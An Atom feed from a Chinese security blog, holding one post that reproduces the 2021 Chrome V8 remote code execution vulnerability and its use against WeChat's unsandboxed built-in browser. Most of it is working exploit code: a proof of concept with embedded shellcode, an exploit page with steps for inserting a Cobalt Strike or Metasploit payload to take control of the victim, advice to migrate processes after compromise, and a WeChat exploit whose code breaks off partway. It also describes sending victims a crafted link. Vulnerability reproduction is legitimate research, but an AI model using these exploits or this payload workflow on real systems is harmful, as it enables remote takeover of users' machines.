<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>KB-AT的博客</title>
  
  <subtitle>KB-AT</subtitle>
  <link href="https://kb-at-zero.github.io/atom.xml" rel="self"/>
  
  <link href="https://kb-at-zero.github.io/"/>
  <updated>2021-04-23T11:32:05.812Z</updated>
  <id>https://kb-at-zero.github.io/</id>
  
  <author>
    <name>AT</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>微信-Chrome远程代码执行</title>
    <link href="https://kb-at-zero.github.io/2021/04/23/%E5%BE%AE%E4%BF%A1-Chrome%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>https://kb-at-zero.github.io/2021/04/23/%E5%BE%AE%E4%BF%A1-Chrome%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</id>
    <published>2021-04-23T09:22:00.000Z</published>
    <updated>2021-04-23T11:32:05.812Z</updated>
    
    <content type="html"><![CDATA[<h1 id="微信-Chrome远程代码执行"><a href="#微信-Chrome远程代码执行" class="headerlink" title="微信-Chrome远程代码执行"></a>微信-Chrome远程代码执行</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2021年04月13日,国外安全研究员发布了Chrome 远程代码执行 0Day的POC详情，后又爆出微信内置浏览器用的就是低版本Chrome内核，且默认关闭沙盒–no-sandbox，正好能够结合Chrome漏洞进行利用，这里借着这个时间来复现一下这个漏洞。</p><h2 id="Chrome漏洞复现"><a href="#Chrome漏洞复现" class="headerlink" title="Chrome漏洞复现"></a>Chrome漏洞复现</h2><p>国外安全研究员发布了Chrome远程代码执行0Day漏洞的POC详情，漏洞为“严重”级别。攻击者利用此漏洞，构造一个恶意的web页面，用户访问该页面时，会造成远程代码执行。</p><p>大量采用Chrome内核的浏览器同样也会受此漏洞影响，如微软的Edge浏览器，影响版本：Chrome: &lt;=89.0.4389.114，可通过在Chrome浏览器中输入chrome://version查看版本等信息。</p><p><img src="/images/pasted-13.png"></p><p>本地测试版本：89.0.4389.9，这个漏洞利用条件是必须关闭Chrome浏览器沙盒–no-sandbox，默认为开启状态，所以一般用户不会受此漏洞影响。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome.exe -no-sandbox</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-15.png"></p><p>POC验证（弹计算器）：<a href="https://github.com/r4j0x00/exploits/tree/master/chrome-0day">https://github.com/r4j0x00/exploits/tree/master/chrome-0day</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">var wasm_code &#x3D; new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])</span><br><span class="line">var wasm_mod &#x3D; new WebAssembly.Module(wasm_code);</span><br><span class="line">var wasm_instance &#x3D; new WebAssembly.Instance(wasm_mod);</span><br><span class="line">var f &#x3D; wasm_instance.exports.main;</span><br><span class="line"></span><br><span class="line">var buf &#x3D; new ArrayBuffer(8);</span><br><span class="line">var f64_buf &#x3D; new Float64Array(buf);</span><br><span class="line">var u64_buf &#x3D; new Uint32Array(buf);</span><br><span class="line">let buf2 &#x3D; new ArrayBuffer(0x150);</span><br><span class="line"></span><br><span class="line">function ftoi(val) &#123;</span><br><span class="line">    f64_buf[0] &#x3D; val;</span><br><span class="line">    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) &lt;&lt; 32n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function itof(val) &#123;</span><br><span class="line">    u64_buf[0] &#x3D; Number(val &amp; 0xffffffffn);</span><br><span class="line">    u64_buf[1] &#x3D; Number(val &gt;&gt; 32n);</span><br><span class="line">    return f64_buf[0];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const _arr &#x3D; new Uint32Array([2**31]);</span><br><span class="line"></span><br><span class="line">function foo(a) &#123;</span><br><span class="line">    var x &#x3D; 1;</span><br><span class="line">x &#x3D; (_arr[0] ^ 0) + 1;</span><br><span class="line"></span><br><span class="line">x &#x3D; Math.abs(x);</span><br><span class="line">x -&#x3D; 2147483647;</span><br><span class="line">x &#x3D; Math.max(x, 0);</span><br><span class="line"></span><br><span class="line">x -&#x3D; 1;</span><br><span class="line">if(x&#x3D;&#x3D;-1) x &#x3D; 0;</span><br><span class="line"></span><br><span class="line">var arr &#x3D; new Array(x);</span><br><span class="line">arr.shift();</span><br><span class="line">var cor &#x3D; [1.1, 1.2, 1.3];</span><br><span class="line"></span><br><span class="line">return [arr, cor];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for(var i&#x3D;0;i&lt;0x3000;++i)</span><br><span class="line">    foo(true);</span><br><span class="line"></span><br><span class="line">var x &#x3D; foo(false);</span><br><span class="line">var arr &#x3D; x[0];</span><br><span class="line">var cor &#x3D; x[1];</span><br><span class="line"></span><br><span class="line">const idx &#x3D; 6;</span><br><span class="line">arr[idx+10] &#x3D; 0x4242;</span><br><span class="line"></span><br><span class="line">function addrof(k) &#123;</span><br><span class="line">    arr[idx+1] &#x3D; k;</span><br><span class="line">    return ftoi(cor[0]) &amp; 0xffffffffn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fakeobj(k) &#123;</span><br><span class="line">    cor[0] &#x3D; itof(k);</span><br><span class="line">    return arr[idx+1];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var float_array_map &#x3D; ftoi(cor[3]);</span><br><span class="line"></span><br><span class="line">var arr2 &#x3D; [itof(float_array_map), 1.2, 2.3, 3.4];</span><br><span class="line">var fake &#x3D; fakeobj(addrof(arr2) + 0x20n);</span><br><span class="line"></span><br><span class="line">function arbread(addr) &#123;</span><br><span class="line">    if (addr % 2n &#x3D;&#x3D; 0) &#123;</span><br><span class="line">        addr +&#x3D; 1n;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[1] &#x3D; itof((2n &lt;&lt; 32n) + addr - 8n);</span><br><span class="line">    return (fake[0]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function arbwrite(addr, val) &#123;</span><br><span class="line">    if (addr % 2n &#x3D;&#x3D; 0) &#123;</span><br><span class="line">        addr +&#x3D; 1n;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[1] &#x3D; itof((2n &lt;&lt; 32n) + addr - 8n);</span><br><span class="line">    fake[0] &#x3D; itof(BigInt(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function copy_shellcode(addr, shellcode) &#123;</span><br><span class="line">    let dataview &#x3D; new DataView(buf2);</span><br><span class="line">    let buf_addr &#x3D; addrof(buf2);</span><br><span class="line">    let backing_store_addr &#x3D; buf_addr + 0x14n;</span><br><span class="line">    arbwrite(backing_store_addr, addr);</span><br><span class="line"></span><br><span class="line">    for (let i &#x3D; 0; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">        dataview.setUint32(4*i, shellcode[i], true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var rwx_page_addr &#x3D; ftoi(arbread(addrof(wasm_instance) + 0x68n));</span><br><span class="line">console.log(&quot;[+] Address of rwx page: &quot; + rwx_page_addr.toString(16));</span><br><span class="line">var shellcode &#x3D; [3833809148,12642544,1363214336,1364348993,3526445142,1384859749,1384859744,1384859672,1921730592,3071232080,827148874,3224455369,2086747308,1092627458,1091422657,3991060737,1213284690,2334151307,21511234,2290125776,1207959552,1735704709,1355809096,1142442123,1226850443,1457770497,1103757128,1216885899,827184641,3224455369,3384885676,3238084877,4051034168,608961356,3510191368,1146673269,1227112587,1097256961,1145572491,1226588299,2336346113,21530628,1096303056,1515806296,1497454657,2202556993,1379999980,1096343807,2336774745,4283951378,1214119935,442,0,2374846464,257,2335291969,3590293359,2729832635,2797224278,4288527765,3296938197,2080783400,3774578698,1203438965,1785688595,2302761216,1674969050,778267745,6649957];</span><br><span class="line">copy_shellcode(rwx_page_addr, shellcode);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-14.png"></p><p>上边的POC只是单纯验证弹出计算器，如果想要上线到CS/MSF得用下边这个EXP，在CS或MSF中生成一个64位的C Payload（C#则无需替换），然后将里边的shellcode（这里选择CS上线）提取出来并将其中的<code>\</code>替换为<code> ,0</code>放到exploit2.html文件中即可。</p><ul><li><p>CS监听端口（随自己选择）<br><img src="/images/pasted-16.png"></p></li><li><p>生成payload<br><img src="/images/pasted-17.png"></p></li><li><p>替换payload，将其中的<code>\</code>替换为<code> ,0</code><br><img src="/images/pasted-18.png"><br><img src="/images/pasted-19.png"></p></li><li><p>取出替换后的shellcode，放入以下html的shellcode中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;chrome test&lt;&#x2F;title&gt;</span><br><span class="line">&lt;h1&gt;test&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">   function gc() &#123;</span><br><span class="line">       for (var i &#x3D; 0; i &lt; 0x80000; ++i) &#123;</span><br><span class="line">           var a &#x3D; new ArrayBuffer();</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">   let shellcode &#x3D; [];</span><br><span class="line">   var wasmCode &#x3D; new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);</span><br><span class="line">   var wasmModule &#x3D; new WebAssembly.Module(wasmCode);</span><br><span class="line">   var wasmInstance &#x3D; new WebAssembly.Instance(wasmModule);</span><br><span class="line">   var main &#x3D; wasmInstance.exports.main;</span><br><span class="line">   var bf &#x3D; new ArrayBuffer(8);</span><br><span class="line">   var bfView &#x3D; new DataView(bf);</span><br><span class="line">   function fLow(f) &#123;</span><br><span class="line">       bfView.setFloat64(0, f, true);</span><br><span class="line">       return (bfView.getUint32(0, true));</span><br><span class="line">  &#125;</span><br><span class="line">   function fHi(f) &#123;</span><br><span class="line">       bfView.setFloat64(0, f, true);</span><br><span class="line">       return (bfView.getUint32(4, true))</span><br><span class="line">  &#125;</span><br><span class="line">   function i2f(low, hi) &#123;</span><br><span class="line">       bfView.setUint32(0, low, true);</span><br><span class="line">       bfView.setUint32(4, hi, true);</span><br><span class="line">       return bfView.getFloat64(0, true);</span><br><span class="line">  &#125;</span><br><span class="line">   function f2big(f) &#123;</span><br><span class="line">       bfView.setFloat64(0, f, true);</span><br><span class="line">       return bfView.getBigUint64(0, true);</span><br><span class="line">  &#125;</span><br><span class="line">   function big2f(b) &#123;</span><br><span class="line">       bfView.setBigUint64(0, b, true);</span><br><span class="line">       return bfView.getFloat64(0, true);</span><br><span class="line">  &#125;</span><br><span class="line">   class LeakArrayBuffer extends ArrayBuffer &#123;</span><br><span class="line">       constructor(size) &#123;</span><br><span class="line">           super(size);</span><br><span class="line">           this.slot &#x3D; 0xb33f;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">   function foo(a) &#123;</span><br><span class="line">       let x &#x3D; -1;</span><br><span class="line">       if (a) x &#x3D; 0xFFFFFFFF;</span><br><span class="line">       var arr &#x3D; new Array(Math.sign(0 - Math.max(0, x, -1)));</span><br><span class="line">       arr.shift();</span><br><span class="line">       let local_arr &#x3D; Array(2);</span><br><span class="line">       local_arr[0] &#x3D; 5.1;&#x2F;&#x2F;4014666666666666</span><br><span class="line">       let buff &#x3D; new LeakArrayBuffer(0x1000);&#x2F;&#x2F;byteLength idx&#x3D;8</span><br><span class="line">       arr[0] &#x3D; 0x1122;</span><br><span class="line">       return [arr, local_arr, buff];</span><br><span class="line">  &#125;</span><br><span class="line">   for (var i &#x3D; 0; i &lt; 0x10000; ++i)</span><br><span class="line">       foo(false);</span><br><span class="line">   gc(); gc();</span><br><span class="line">  [corrput_arr, rwarr, corrupt_buff] &#x3D; foo(true);</span><br><span class="line">   corrput_arr[12] &#x3D; 0x22444;</span><br><span class="line">   delete corrput_arr;</span><br><span class="line">   function setbackingStore(hi, low) &#123;</span><br><span class="line">       rwarr[4] &#x3D; i2f(fLow(rwarr[4]), hi);</span><br><span class="line">       rwarr[5] &#x3D; i2f(low, fHi(rwarr[5]));</span><br><span class="line">  &#125;</span><br><span class="line">   function leakObjLow(o) &#123;</span><br><span class="line">       corrupt_buff.slot &#x3D; o;</span><br><span class="line">       return (fLow(rwarr[9]) - 1);</span><br><span class="line">  &#125;</span><br><span class="line">   let corrupt_view &#x3D; new DataView(corrupt_buff);</span><br><span class="line">   let corrupt_buffer_ptr_low &#x3D; leakObjLow(corrupt_buff);</span><br><span class="line">   let idx0Addr &#x3D; corrupt_buffer_ptr_low - 0x10;</span><br><span class="line">   let baseAddr &#x3D; (corrupt_buffer_ptr_low &amp; 0xffff0000) - ((corrupt_buffer_ptr_low &amp; 0xffff0000) % 0x40000) + 0x40000;</span><br><span class="line">   let delta &#x3D; baseAddr + 0x1c - idx0Addr;</span><br><span class="line">   if ((delta % 8) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">       let baseIdx &#x3D; delta &#x2F; 8;</span><br><span class="line">       this.base &#x3D; fLow(rwarr[baseIdx]);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">       let baseIdx &#x3D; ((delta - (delta % 8)) &#x2F; 8);</span><br><span class="line">       this.base &#x3D; fHi(rwarr[baseIdx]);</span><br><span class="line">  &#125;</span><br><span class="line">   let wasmInsAddr &#x3D; leakObjLow(wasmInstance);</span><br><span class="line">   setbackingStore(wasmInsAddr, this.base);</span><br><span class="line">   let code_entry &#x3D; corrupt_view.getFloat64(13 * 8, true);</span><br><span class="line">   setbackingStore(fLow(code_entry), fHi(code_entry));</span><br><span class="line">   for (let i &#x3D; 0; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">       corrupt_view.setUint8(i, shellcode[i]);</span><br><span class="line">  &#125;</span><br><span class="line">   main();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-20.png"></p></li><li><p>-no-sandbox 参数 关闭沙箱，在chrome浏览器打开exploit2.html， CS 上线<br><img src="/images/pasted-22.png"><br><img src="/images/pasted-21.png"><br>关闭该页面会话即断开，建议在上线后执行进程迁移。</p></li></ul><hr><h2 id="微信CS上线复现"><a href="#微信CS上线复现" class="headerlink" title="微信CS上线复现"></a>微信CS上线复现</h2><p>微信内置浏览器使用Chrome内核，且默认关闭沙盒–no-sandbox，所以可以直接利用Chrome远程代码执行漏洞，黑客只需要通过微信发送一个特制Web链接，用户一旦点击链接，微信PC Windows版进程wechatweb.exe会加载shellcode执行，整个过程无文件落地，无新进程产生。<br>可以访问一下链接来查看微信内置chrome浏览器的版本：</p><ul><li><a href="https://wuchendi.gitee.io/chrome/index.html">https://wuchendi.gitee.io/chrome/index.html</a><br><img src="/images/pasted-25.png"><br><img src="/images/pasted-26.png"></li><li>微信的利用方式与Chrome差不多，就不再详细写具体步骤了，只需要将以下EXP中的第5行shellcode替换为我们CS或MSF生成的32位C# Payload即可。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line">ENABLE_LOG &#x3D; true;</span><br><span class="line">IN_WORKER &#x3D; true;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; run calc and hang in a loop</span><br><span class="line">var shellcode &#x3D; [  ];</span><br><span class="line"></span><br><span class="line">function print(data) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var not_optimised_out &#x3D; 0;</span><br><span class="line">var target_function &#x3D; (function (value) &#123;</span><br><span class="line">    if (value &#x3D;&#x3D; 0xdecaf0) &#123;</span><br><span class="line">        not_optimised_out +&#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line">    not_optimised_out +&#x3D; 1;</span><br><span class="line">    not_optimised_out |&#x3D; 0xff;</span><br><span class="line">    not_optimised_out *&#x3D; 12;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">for (var i &#x3D; 0; i &lt; 0x10000; ++i) &#123;</span><br><span class="line">    target_function(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var g_array;</span><br><span class="line">var tDerivedNCount &#x3D; 17 * 87481 - 8;</span><br><span class="line">var tDerivedNDepth &#x3D; 19 * 19;</span><br><span class="line"></span><br><span class="line">function cb(flag) &#123;</span><br><span class="line">    if (flag &#x3D;&#x3D; true) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    g_array &#x3D; new Array(0);</span><br><span class="line">    g_array[0] &#x3D; 0x1dbabe * 2;</span><br><span class="line">    return &#39;c01db33f&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function gc() &#123;</span><br><span class="line">    for (var i &#x3D; 0; i &lt; 0x10000; ++i) &#123;</span><br><span class="line">        new String();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function oobAccess() &#123;</span><br><span class="line">    var this_ &#x3D; this;</span><br><span class="line">    this.buffer &#x3D; null;</span><br><span class="line">    this.buffer_view &#x3D; null;</span><br><span class="line"></span><br><span class="line">    this.page_buffer &#x3D; null;</span><br><span class="line">    this.page_view &#x3D; null;</span><br><span class="line"></span><br><span class="line">    this.prevent_opt &#x3D; [];</span><br><span class="line"></span><br><span class="line">    var kSlotOffset &#x3D; 0x1f;</span><br><span class="line">    var kBackingStoreOffset &#x3D; 0xf;</span><br><span class="line"></span><br><span class="line">    class LeakArrayBuffer extends ArrayBuffer &#123;</span><br><span class="line">        constructor() &#123;</span><br><span class="line">            super(0x1000);</span><br><span class="line">            this.slot &#x3D; this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    this.page_buffer &#x3D; new LeakArrayBuffer();</span><br><span class="line">    this.page_view &#x3D; new DataView(this.page_buffer);</span><br><span class="line"></span><br><span class="line">    new RegExp(&#123; toString: function () &#123; return &#39;a&#39; &#125; &#125;);</span><br><span class="line">    cb(true);</span><br><span class="line"></span><br><span class="line">    class DerivedBase extends RegExp &#123;</span><br><span class="line">        constructor() &#123;</span><br><span class="line">            &#x2F;&#x2F; var array &#x3D; null;</span><br><span class="line">            super(</span><br><span class="line">                &#x2F;&#x2F; at this point, the 4-byte allocation for the JSRegExp &#96;this&#96; object</span><br><span class="line">                &#x2F;&#x2F; has just happened.</span><br><span class="line">                &#123;</span><br><span class="line">                    toString: cb</span><br><span class="line">                &#125;, &#39;g&#39;</span><br><span class="line">                &#x2F;&#x2F; now the runtime JSRegExp constructor is called, corrupting the</span><br><span class="line">                &#x2F;&#x2F; JSArray.</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; this allocation will now directly follow the FixedArray allocation</span><br><span class="line">            &#x2F;&#x2F; made for &#96;this.data&#96;, which is where &#96;array.elements&#96; points to.</span><br><span class="line">            this_.buffer &#x3D; new ArrayBuffer(0x80);</span><br><span class="line">            g_array[8] &#x3D; this_.page_buffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; try&#123;</span><br><span class="line">    var derived_n &#x3D; eval(&#96;(function derived_n(i) &#123;</span><br><span class="line">        if (i &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            return DerivedBase;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        class DerivedN extends derived_n(i-1) &#123;</span><br><span class="line">            constructor() &#123;</span><br><span class="line">                super();</span><br><span class="line">                return;</span><br><span class="line">                $&#123;&quot;this.a&#x3D;0;&quot;.repeat(tDerivedNCount)&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return DerivedN;</span><br><span class="line">    &#125;)&#96;);</span><br><span class="line"></span><br><span class="line">    gc();</span><br><span class="line"></span><br><span class="line">    new (derived_n(tDerivedNDepth))();</span><br><span class="line"></span><br><span class="line">    this.buffer_view &#x3D; new DataView(this.buffer);</span><br><span class="line">    this.leakPtr &#x3D; function (obj) &#123;</span><br><span class="line">        this.page_buffer.slot &#x3D; obj;</span><br><span class="line">        return this.buffer_view.getUint32(kSlotOffset, true, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    this.setPtr &#x3D; function (addr) &#123;</span><br><span class="line">        this.buffer_view.setUint32(kBackingStoreOffset, addr, true, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    this.read32 &#x3D; function (addr) &#123;</span><br><span class="line">        this.setPtr(addr);</span><br><span class="line">        return this.page_view.getUint32(0, true, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    this.write32 &#x3D; function (addr, value) &#123;</span><br><span class="line">        this.setPtr(addr);</span><br><span class="line">        this.page_view.setUint32(0, value, true, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    this.write8 &#x3D; function (addr, value) &#123;</span><br><span class="line">        this.setPtr(addr);</span><br><span class="line">        this.page_view.setUint8(0, value, ...this.prevent_opt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    this.setBytes &#x3D; function (addr, 